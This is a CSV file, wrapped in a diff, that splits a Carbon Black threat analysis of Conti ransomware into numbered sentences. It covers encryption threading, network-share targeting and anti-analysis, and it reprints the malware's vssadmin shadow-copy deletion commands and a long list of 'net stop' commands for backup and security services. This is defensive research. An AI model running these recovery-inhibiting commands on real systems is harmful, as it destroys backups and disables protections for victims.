@@ -1,0 +1,323 @@
+Number,Content
+Sentence 1,"TAU Threat Discovery: Conti Ransomware
+Brian Baskin  July 8, 2020 30 min read
+
+Conti is a new family of ransomware observed in the wild by the Carbon Black Threat Analysis Unit (TAU)."
+Sentence 2,"Unlike most ransomware, Conti contains  unique features that separate it in terms of performance and focus on network-based targets."
+Sentence 3,"Conti uses a large number of independent threads to perform encryption, allowing up to 32 simultaneous encryption efforts, resulting in faster encryption compared to many other families."
+Sentence 4,"Conti also utilizes command line options to allow for control over how it scans for data, suggesting that the malware may commonly be spread and directly controlled by an adversary."
+Sentence 5,"This control introduces the novel ability of skipping the encryption of local files and only targeting networked SMB shares, including those from IP addresses specifically provided by the adversary."
+Sentence 6,This is a very rare ability that’s previously been seen with the Sodinokibi ransomware family.
+Sentence 7,"Another new technique, documented in very few ransomware families, is the use of the Windows Restart Manager to ensure that all files can be encrypted."
+Sentence 8,"Just as Windows will attempt to cleanly shut down open applications when the operating system is rebooted, the ransomware will utilize the same functionality to cleanly close the application that has a file locked."
+Sentence 9,"By doing so, the file is freed up for encryption."
+Sentence 10,"Technical Details 
+
+In many ways Conti is a  standard representation of modern ransomware."
+Sentence 11,"It iterates through files on the local system, and those on remote SMB network shares, to determine what data to encrypt."
+Sentence 12,"Encryption then appears to reference traces of AES-256 and a variant of ChaCha while using a hard-coded public key, noted in the Appendix."
+Sentence 13,"Conti begins to show its unique characteristics upon analysis, where it has multiple anti-analysis features to slow detection and reverse engineering."
+Sentence 14,The primary form is the use of a unique string encoding routine that is applied to almost every string text used by the malware.
+Sentence 15,"In fact, it is used in 277 different algorithms – one per string."
+Sentence 16,"Almost 230 of these algorithms are placed in dedicated subroutines, ballooning the amount of code within the simple program."
+Sentence 17,Examples are shown in the figures below.
+Sentence 18,"Figure 1: Inline string deobfuscation for the mutex value of “_CONTI_”
+
+
+
+Figure 2: Subroutine for string deobfuscation 
+
+The most notable use for this obfuscation is to hide the various Windows API calls used by the malware."
+Sentence 19,It is common for some malware to lookup these API calls during execution.
+Sentence 20,"As shown in the figure below, these routines are decoded on-the-fly, resolved to the actual API, and then stored into a global variable for later use elsewhere in the malware."
+Sentence 21,"Figure 3: Decoding of strings for API resolution 
+
+Command line capabilities 
+
+There are a small number of ransomware families that target the local network to encrypt via SMB."
+Sentence 22,"Conti’s very unique feature is that it allows command line arguments to direct it to encrypt the local hard drive or network shares, even specific, targeted, IP addresses."
+Sentence 23,"From this functionality, it appears that Conti was designed, in part, to be executed directly by an adversary that is monitoring the environment."
+Sentence 24,"This is the opposite of ransomware that’s designed to be executed via an email attachment or drive-by download, in which the ransomware just executes independently."
+Sentence 25,"Conti does have the ability to be executed independently, with no interaction, in which case it will simply encrypt all local files and then any connectable network shares."
+Sentence 26,The default action is to scan both local hard drives and network shares but this can be overridden by the command line option of “—encrypt_mode.”.
+Sentence 27,"With the command line argument of “—encrypt_mode local,”, the ransomware will focus solely on the local hard drive encryption and then exit."
+Sentence 28,"Alternatively, the “—encrypt_mode network” argument will skip the local hard drives and only encrypt network shares."
+Sentence 29,"Additionally, the ransomware supports the “-h” command line argument that can point to a text file containing a list of network hostnames, each separated by a new line."
+Sentence 30,This allows the ransomware to first iterate through hosts that it routinely connects to and then target specific machines elsewhere on the network as specified by the adversary.
+Sentence 31,The notable effect of this capability is that it can cause targeted damage in an environment in a method that could frustrate incident response activities.
+Sentence 32,"A successful attack may have destruction that’s limited to the shares of a server that has no Internet capability, but where there is no evidence of similar destruction elsewhere in the environment."
+Sentence 33,This also has the effect of reducing the overall “noise” of a ransomware attack where hundreds of systems immediately start showing signs of infection.
+Sentence 34,"Instead, the encryption may not even be noticeable for days, or weeks, later once the data is accessed by a user."
+Sentence 35,"Preparing the victim and inhibiting system recovery 
+
+Conti has an extremely busy and loud methodology for stopping services and inhibiting recovery on the local system."
+Sentence 36,"While many ransomware families will simply delete the Windows Volume Shadow Copies using vssadmin, Conti uses vssadmin in unique ways to ensure their deletion, shown below: 
+
+vssadmin Delete Shadows /all /quiet
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded 
+Figure 4: VSSAdmin commands executed by Conti 
+
+While the first vssadmin command is the most common one used by ransomware, the remainder are fairly unique and seen in few ransomware families."
+Sentence 37,"Additionally, the malware will execute 160 individual commands – 146 of which focused on stopping potential Windows services."
+Sentence 38,These commands are noted in the Appendix and include commands such as those in the figure below.
+Sentence 39,The entirety of commands greatly mimics those that are also found within the Ryuk ransomware family.
+Sentence 40,"net stop “Acronis VSS Provider” /y
+net stop “Enterprise Client Service” /y
+net stop “SQLsafe Backup Service” /y
+net stop “SQLsafe Filter Service” /y
+net stop “Veeam Backup Catalog Data Service” /y
+net stop AcronisAgent /y 
+Figure 5: Sample set of services being stopped by Conti 
+
+Finally, the malware will enumerate through all open processes to search for any that have the string “sql” in their process name."
+Sentence 41,"If so, it will terminate the process before continuing, as shown in the figure below."
+Sentence 42,"Figure 6: Code for searching for terminating any process containing “sql” 
+
+File discovery methods 
+
+Unlike many families of ransomware, Conti does not target a specific list of files based upon their extension."
+Sentence 43,"It performs the opposite method where it will encrypt all files except those with the extensions of: exe, dll, lnk, and sys."
+Sentence 44,"The malware will then build a list of folders for it to ignore while encrypting, noted in the figure below."
+Sentence 45,"If these values are found anywhere in the file name or path, it will skip encryption within it."
+Sentence 46,"tmp 	winnt 
+Application Data 	AppData 
+temp 	thumb 
+$Recycle Bin 	$RECYCLE BIN 
+System Volume Information 	Program Files 
+Program Files (x86) 	Boot 
+Windows 	 
+Figure 7: List of keywords to ignore files and folder to encrypt  
+
+Additionally, the malware will search for a predefined list of files to ignore that is stored within the malware as a resource."
+Sentence 47,"This data is stored under the value of the resource “102,”, which was set to “null” in the analyzed sample."
+Sentence 48,"While the ransomware is enumerating files, it will refer to this value to look for a comma-delimited string."
+Sentence 49,"If found, it will parse each entry and skip the file if the file path contains that specific keyword."
+Sentence 50,"Resource ID 	Resource Value 
+101\0 	The network is LOCKED."
+Sentence 51,Do not try to use other software.
+Sentence 52,"For decryption KEY write HERE: 
+ 
+
+flapalinta1950@protonmail.com 
+
+xersami@protonmail.com 
+
+101\1049 	HOW_TO_DECRYPT 
+102\0 	null 
+102\1049 	null 
+Figure 8: Resource data from within malware sample 
+
+Unlocking files via the Windows Restart Manager 
+
+The use of the Windows Restart Manager in ransomware is a new and unique technique."
+Sentence 53,We’ve previously documented this in our analysis of Medusa Locker.
+Sentence 54,The Restart Manager is a component of Windows that many users take for granted.
+Sentence 55,"Upon restarting the computer, it will attempt to gracefully close all running applications and open files."
+Sentence 56,"If there are files currently open, and unsaved, it will attempt to alert the user to save their data."
+Sentence 57,"After a certain amount of time, however, the executable will close."
+Sentence 58,"Once all open files are closed, Windows will continue to restart."
+Sentence 59,"While Windows does this on the entire system for restarting, Restart Manager can also be controlled by an application to close and unlock specific files."
+Sentence 60,"For each file to be encrypted, Conti will process that file through the Restart Manager to ensure that it is unlocked and open for encryption, maximizing the amount of damage it does."
+Sentence 61,"Figure 9: Portion of code used to call Restart Manager on a file path (Overlapped->Offset)
+
+Encryption method 
+
+Once the system has been prepared and files have been identified, Conti will begin the process of iterating through each folder, creating a ransom note, and encrypting files to have a file extension of “.CONTI”."
+Sentence 62,"The ransom note, named CONTI_README.txt, is retrieved from the executable’s resources as shown earlier."
+Sentence 63,Its status as a resource allows the adversary to quickly change the note on-the-fly without recompiling the executable.
+Sentence 64,"While Conti uses a traditional method of encryption, one unique factor is how it can thread the encryption of files that emphasizes performance."
+Sentence 65,This allowed it to encrypt files dozens of times faster than a typical ransomware application.
+Sentence 66,This is seen by using the APIs that utilize Windows I/O Completion Ports.
+Sentence 67,Conti has an encryption “worker” thread that is focused on performing encryption on a given filename.
+Sentence 68,The malware uses the CreateIoCompletionPort() call to create 32 instances of this worker thread into memory to wait for data.
+Sentence 69,"Once the list of files has been created, they are fed to the threads for immediate encryption."
+Sentence 70,"Figure 10: Line of code for creating 32 simultaneous threads for encryption 
+
+The malware then uses the PostQueuedCompletionStatus() call to pass the path of the file to be encrypted into the thread."
+Sentence 71,GetQueuedCompletionPort() to receive the results of the thread and finalize the encryption.
+Sentence 72,"Figure 11: Code used for processes the encryption threads 
+
+If the malware is set to encrypt the network shares, it will perform just a few different operations."
+Sentence 73,This starts with determining if the “-h” command line argument was used to provide a list of hostnames to process.
+Sentence 74,"If so, those hosts are immediately scanned with the NetShareEnum() API call to determine if they have open SMB network shares."
+Sentence 75,"If so, those shares are reviewed for files to encrypt."
+Sentence 76,"Figure 12: Code used for enumerating network shares for hosts specified by adversary 
+
+The malware will then retrieve the ARP cache from the local system by using the GetIpNetTable() API call."
+Sentence 77,"This will return a list of all systems the computer was recently communicating with, andwith and is equivalent to running the “arp -a” command."
+Sentence 78,"In this manner, Conti avoids a very noisy scan of the entire network by focusing only on systems that the victim normally connects to."
+Sentence 79,"Figure 13: Code used to collect the contents of the local ARP cache 
+
+Once the ARP cache is acquired, Conti will perform one more set of checks to ensure that the IP addresses it connects to begin with either “172.”, “192.168.”, or “10.”."
+Sentence 80,"These prefixes specify the most common IP address ranges for local, non-Internet, systems."
+Sentence 81,"Any other IP address is discarded, unless it was specifically set in the optional hosts file."
+Sentence 82,"Once the remote machines have been assessed, Conti will then create a similar approach of encryption as local files by using 32 threads to enumerate through each share and encrypt data."
+Sentence 83,"Overall, Conti represents a unique twist in modern ransomware."
+Sentence 84,"We have tracked numerous families that are designed to be driven by the adversary while on the network, with access gained through weak RDP access or vulnerable Internet-facing services."
+Sentence 85,Conti shows an intention behind the actor to also respond to reconnaissance to determine worthwhile servers in the environment that are sensitive to data encryption.
+Sentence 86,"It’s implementation of multi-threaded processing, as well as the use of the Windows Restart Manager, shows a feature of incredibly quick, and thorough, encryption of data."
+Sentence 87,The use of large-scale service termination supports this with a focus on targeting a vast array of applications that can be found all across the small business and enterprise fields.
+Sentence 88,"Appendix
+
+File Size      : 103,424 
+MD5            : b7b5e1253710d8927cbe07d52d2d2e10 
+
+SHA1           : 596f1fdb5a3de40cccfe1d8183692928b94b8afb 
+
+SHA256         : eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe 
+
+Magic          : PE32 executable (GUI) Intel 80386, for MS Windows 
+
+Compiled Time  : Thu Jun  4 00:02:10 2020 UTC 
+
+PE Sections (5): Name       Size       SHA256 
+
+                  .text      94,720     67f9404df22c6b1e82807f5c527805083f40b70b9dac6bc27c2583b70de17390 
+
+                  .rdata     1,024      749c4c343978b9f236838034f868dac937fdfd9af31a6e5dd05b993a87d51276 
+
+                  .data      4,608      895007b045448dfa8f6c9ee22f76f416f3f18095a063f5e73a4137bcccc0dc9a 
+
+                  .rsrc      1,024      61653b3cd1a290bbc531181edec807b20e263599aa6a2908dc259b867ec98297 
+
+                  .reloc     1,024      6b1b4bbff59456dfaa3307a20171fd7394f49a5f6d1b3cd59392ba41e4881878 
+
+Figure 14: Metadata for the Conti malware sample 
+
+0000h: 0602 0000 00a4 0000 5253 4131 0010 0000  ……..RSA1…."
+Sentence 89,0010h: 0100 0100 5d63 3ea8 cabc fc7f e788 ad73  ….
+Sentence 90,"]c>……..s
+0020h: 7188 688a 4dc4 c4e8 b064 27be 60d7 de6c  q.h.M….d’.`..l
+0030h: 7ca1 ec6e a6c3 1bd7 9cde 1e84 5ddd c203  |..n……..]…
+0040h: 9d6f 5634 16a6 75ae ee3e 4dff 298d c10a  .oV4..u..>M."
+Sentence 91,")…
+0050h: 9c00 1cee e32c b8c2 4785 d027 54f8 e21c  …..,..G..’T…
+0060h: abcd e5c8 94ee 9f79 ae87 26c8 b0bf abb8  …….y..&…..
+0070h: a579 f6e7 4c4d c73c 19c2 4c93 f748 8278  .y..LM.<..L..H.x
+0080h: d3dd 038c daef fb74 56d7 69e7 c9d4 c191  …….tV.i…..
+0090h: f503 2a8d f610 8d88 7299 d0d6 1202 3322  ..*…..r…..3″
+00a0h: 9593 1811 57ee 9c1a 9cde 5f38 ec8c dcfe  ….W….._8…."
+Sentence 92,00b0h: bc57 1c05 fd76 6535 3e2a 4ee5 042d 60f2  .W…ve5>*N..-`.
+Sentence 93,00c0h: 0f29 be76 77f1 bc98 9ab3 ffcc 6e0e 9b48  .
+Sentence 94,").vw…….n..H
+00d0h: 26e2 eb47 aaa4 b9d7 01b2 0033 00ba f0f9  &..G…….3…."
+Sentence 95,00e0h: 6c05 3b86 37c1 4fc9 93a2 ac00 4bec 6afb  l.;.7.O…..K.j.
+Sentence 96,00f0h: 8a01 e342 8721 a18a 627f eaaa ba32 4f09  …B.!..b….2O.
+Sentence 97,0100h: def6 1d6f e131 f8b9 f57f 0234 4e3f 9e3b  …o.1…..4N?.
+Sentence 98,";
+0110h: cd81 cfd0 9a22 8e25 faa2 67cc 871e f166  …..”.%..g….f
+0120h: addd d0af 8101 876e 3634 b594 166e 6b30  …….n64…nk0
+0130h: ee9f a559 f384 81b0 46d5 7079 3b91 eae8  …Y….F.py;…
+0140h: dc58 c072 a69f 001f 9ab1 2b18 3312 9726  .X.r……+.3..&
+0150h: cb64 6397 c8f5 e45b 4660 fadf 3f5f 00a3  .dc….[F`..?_.."
+Sentence 99,"0160h: 401b ae36 bc59 a8dc 9b1f fd24 0e4e a256  @..6.Y…..$.N.V
+0170h: cbea 9a60 6686 88a3 be4f 44bf 25d1 0141  …`f….OD.%..A
+0180h: dd35 8a87 08ca 3d06 af38 9d7d 1a0f 3aa0  .5….=..8.}..:."
+Sentence 100,"0190h: d41f 9476 6fcd 090e 83c4 e0a3 e189 936a  …vo……….j
+01a0h: f130 8fea 1462 c354 88a5 9af0 6691 cb2b  .0…b.T….f..+
+01b0h: 7cc8 3e5f 3959 c436 77e0 58ad 938d cf5b  |.>_9Y.6w.X…."
+Sentence 101,"[
+01c0h: 3140 0923 ace9 5c82 3847 9fa7 5b4c 5078  1@.#..\.8G..[LPx
+01d0h: 374e acdb ad27 1dd3 db1c 496e 730a 45a0  7N…’….Ins.E."
+Sentence 102,"01e0h: c813 af78 a269 0549 0d73 edec c80d cf52  …x.i.I.s…..R
+01f0h: f271 b886 d18a e317 e779 5f78 c933 365d  .q…….y_x.36]
+0200h: b366 2851 c323 43c5 b797 860b 3780 5686  .f(Q.#C…..7.V."
+Sentence 103,0210h: 8387 c3c1                                ….
+Sentence 104,"Figure 15: Hardcoded encryption key
+
+vssadmin Delete Shadows /all /quiet 	net stop MSSQLServerADHelper100 /y 
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB 	net stop MSSQLServerOLAPService /y 
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded 	net stop MySQL57 /y 
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB 	net stop ntrtscan /y 
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded 	net stop OracleClientCache80 /y 
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB 	net stop PDVFSService /y 
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded 	net stop POP3Svc /y 
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB 	net stop ReportServer /y 
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded 	net stop ReportServer$SQL_2008 /y 
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB 	net stop ReportServer$SYSTEM_BGC /y 
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded 	net stop ReportServer$TPS /y 
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB 	net stop ReportServer$TPSAMA /y 
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded 	net stop RESvc /y 
+vssadmin Delete Shadows /all /quiet 	net stop sacsvr /y 
+net stop “Acronis VSS Provider” /y 	net stop SamSs /y 
+net stop “Enterprise Client Service” /y 	net stop SAVAdminService /y 
+net stop “SQLsafe Backup Service” /y 	net stop SAVService /y 
+net stop “SQLsafe Filter Service” /y 	net stop SDRSVC /y 
+net stop “Veeam Backup Catalog Data Service” /y 	net stop SepMasterService /y 
+net stop AcronisAgent /y 	net stop ShMonitor /y 
+net stop AcrSch2Svc /y 	net stop Smcinst /y 
+net stop Antivirus /y 	net stop SmcService /y 
+net stop ARSM /y 	net stop SMTPSvc /y 
+net stop BackupExecAgentAccelerator /y 	net stop SQLAgent$BKUPEXEC /y 
+net stop BackupExecAgentBrowser /y 	net stop SQLAgent$ECWDB2 /y 
+net stop BackupExecDeviceMediaService /y 	net stop SQLAgent$PRACTTICEBGC /y 
+net stop BackupExecJobEngine /y 	net stop SQLAgent$PRACTTICEMGT /y 
+net stop BackupExecManagementService /y 	net stop SQLAgent$PROFXENGAGEMENT /y 
+net stop BackupExecRPCService /y 	net stop SQLAgent$SBSMONITORING /y 
+net stop BackupExecVSSProvider /y 	net stop SQLAgent$SHAREPOINT /y 
+net stop bedbg /y 	net stop SQLAgent$SQL_2008 /y 
+net stop DCAgent /y 	net stop SQLAgent$SYSTEM_BGC /y 
+net stop EPSecurityService /y 	net stop SQLAgent$TPS /y 
+net stop EPUpdateService /y 	net stop SQLAgent$TPSAMA /y 
+net stop EraserSvc11710 /y 	net stop SQLAgent$VEEAMSQL2008R2 /y 
+net stop EsgShKernel /y 	net stop SQLAgent$VEEAMSQL2012 /y 
+net stop FA_Scheduler /y 	net stop SQLBrowser /y 
+net stop IISAdmin /y 	net stop SQLSafeOLRService /y 
+net stop IMAP4Svc /y 	net stop SQLSERVERAGENT /y 
+net stop McShield /y 	net stop SQLTELEMETRY /y 
+net stop McTaskManager /y 	net stop SQLTELEMETRY$ECWDB2 /y 
+net stop mfemms /y 	net stop SQLWriter /y 
+net stop mfevtp /y 	net stop VeeamBackupSvc /y 
+net stop MMS /y 	net stop VeeamBrokerSvc /y 
+net stop mozyprobackup /y 	net stop VeeamCatalogSvc /y 
+net stop MsDtsServer /y 	net stop VeeamCloudSvc /y 
+net stop MsDtsServer100 /y 	net stop VeeamDeploymentService /y 
+net stop MsDtsServer110 /y 	net stop VeeamDeploySvc /y 
+net stop MSExchangeES /y 	net stop VeeamEnterpriseManagerSvc /y 
+net stop MSExchangeIS /y 	net stop VeeamMountSvc /y 
+net stop MSExchangeMGMT /y 	net stop VeeamNFSSvc /y 
+net stop MSExchangeMTA /y 	net stop VeeamRESTSvc /y 
+net stop MSExchangeSA /y 	net stop VeeamTransportSvc /y 
+net stop MSExchangeSRS /y 	net stop W3Svc /y 
+net stop MSOLAP$SQL_2008 /y 	net stop wbengine /y 
+net stop MSOLAP$SYSTEM_BGC /y 	net stop WRSVC /y 
+net stop MSOLAP$TPS /y 	net stop MSSQL$VEEAMSQL2008R2 /y 
+net stop MSOLAP$TPSAMA /y 	net stop SQLAgent$VEEAMSQL2008R2 /y 
+net stop MSSQL$BKUPEXEC /y 	net stop VeeamHvIntegrationSvc /y 
+net stop MSSQL$ECWDB2 /y 	net stop swi_update /y 
+net stop MSSQL$PRACTICEMGT /y 	net stop SQLAgent$CXDB /y 
+net stop MSSQL$PRACTTICEBGC /y 	net stop SQLAgent$CITRIX_METAFRAME /y 
+net stop MSSQL$PROFXENGAGEMENT /y 	net stop “SQL Backups” /y 
+net stop MSSQL$SBSMONITORING /y 	net stop MSSQL$PROD /y 
+net stop MSSQL$SHAREPOINT /y 	net stop “Zoolz 2 Service” /y 
+net stop MSSQL$SQL_2008 /y 	net stop MSSQLServerADHelper /y 
+net stop MSSQL$SYSTEM_BGC /y 	net stop SQLAgent$PROD /y 
+net stop MSSQL$TPS /y 	net stop msftesql$PROD /y 
+net stop MSSQL$TPSAMA /y 	net stop NetMsmqActivator /y 
+net stop MSSQL$VEEAMSQL2008R2 /y 	net stop EhttpSrv /y 
+net stop MSSQL$VEEAMSQL2012 /y 	net stop ekrn /y 
+net stop MSSQLFDLauncher /y 	net stop ESHASRV /y 
+net stop MSSQLFDLauncher$PROFXENGAGEMENT /y 	net stop MSSQL$SOPHOS /y 
+net stop MSSQLFDLauncher$SBSMONITORING /y 	net stop SQLAgent$SOPHOS /y 
+net stop MSSQLFDLauncher$SHAREPOINT /y 	net stop AVP /y 
+net stop MSSQLFDLauncher$SQL_2008 /y 	net stop klnagent /y 
+net stop MSSQLFDLauncher$SYSTEM_BGC /y 	net stop MSSQL$SQLEXPRESS /y 
+net stop MSSQLFDLauncher$TPS /y 	net stop SQLAgent$SQLEXPRESS /y 
+net stop MSSQLFDLauncher$TPSAMA /y 	net stop wbengine /y 
+net stop MSSQLSERVER /y 	net stop mfefire /y 
+Figure 16: List of command lines executed to stop Windows services and inhibit recovery 
+
+
+Brian Baskin
+Technical Lead, Threat Research @ VMware Carbon Black | I am a professional security researcher and consultant who specializes in incident response, malware analysis, and threat intelligence with over a…"
